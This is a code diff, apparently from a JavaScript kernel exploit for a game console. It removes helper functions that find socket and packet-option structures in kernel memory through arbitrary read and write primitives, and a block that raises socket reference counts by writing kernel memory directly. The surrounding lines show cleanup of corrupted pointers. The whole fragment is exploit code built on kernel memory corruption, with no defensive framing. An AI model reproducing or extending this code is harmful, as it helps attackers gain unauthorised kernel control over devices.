@@ -178,29 +178,6 @@ function call_nze(...args) {
     }
 }
 
-const { read64, write64, read32, write32 } = kmem;
-const {
-  CURPROC_OFILES,
-  SIZEOF_OFILES,
-  SO_PCB,
-  INPCB_PKTOPTS
-} = kernel_offset;
-
-/** @returns {bigint} f_data (struct socket*) */
-function get_fd_data_addr(sock, read_fn) {
-  const fdesc = kernel.addr.curproc + CURPROC_OFILES + BigInt(sock) * BigInt(SIZEOF_OFILES);
-  const filep = read_fn(fdesc);
-  return read_fn(filep);
-}
-
-/** @returns {bigint} inp_pktopts */
-function get_sock_pktopts(sock, read_fn) {
-  const sock_data = get_fd_data_addr(sock, read_fn);
-  const pcb       = read_fn(sock_data + BigInt(SO_PCB));
-  return read_fn(pcb       + BigInt(INPCB_PKTOPTS));
-}
-
-
 // #define SCE_KERNEL_AIO_STATE_NOTIFIED       0x10000
 //
 // #define SCE_KERNEL_AIO_STATE_SUBMITTED      1
@@ -1495,20 +1472,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      kmem.write64(r_rthdr_p, 0);
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
-    
- const sock_increase_ref = [
-    main_sock,
-    worker_sock,
-    reclaim_sock,
-  ];
-  for (const sd of sock_increase_ref) {
-    const sock_addr = get_fd_data_addr(sd, read64.bind(kmem));
-    // leggi vecchio so_count, incrementalo di 1 e riscrivilo
-    const old = read32.call(kmem, sock_addr + 0x0);
-    write32.call(kmem, sock_addr + 0x0, old + 1);
-  }
-  log('reference counts boosted');
-    
+
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
